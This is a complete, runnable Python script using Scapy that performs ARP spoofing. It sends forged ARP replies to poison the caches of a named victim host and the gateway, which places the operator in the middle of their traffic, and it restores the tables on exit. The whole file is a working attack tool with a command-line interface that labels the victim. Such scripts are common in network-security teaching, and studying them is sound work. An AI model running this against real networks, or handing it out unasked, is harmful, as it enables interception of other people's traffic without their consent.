import scapy.all as scapy
import time
import argparse
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not resolve MAC for {ip}")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.sendp(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=src_ip,
        hwsrc=src_mac
    )
    scapy.sendp(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofer using Scapy")
    parser.add_argument("-t", "--target", required=True, help="Target IP Address (victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address (router)")

    args = parser.parse_args()
    target_ip = args.target
    gateway_ip = args.gateway

    print(f"[+] Spoofing {target_ip} <--> {gateway_ip} ... Press CTRL+C to stop.")
    sent_packet_count = 0

    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packet_count += 2
            print("\r[+] Packets sent: " + str(sent_packet_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C ... Restoring ARP tables. Please wait...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
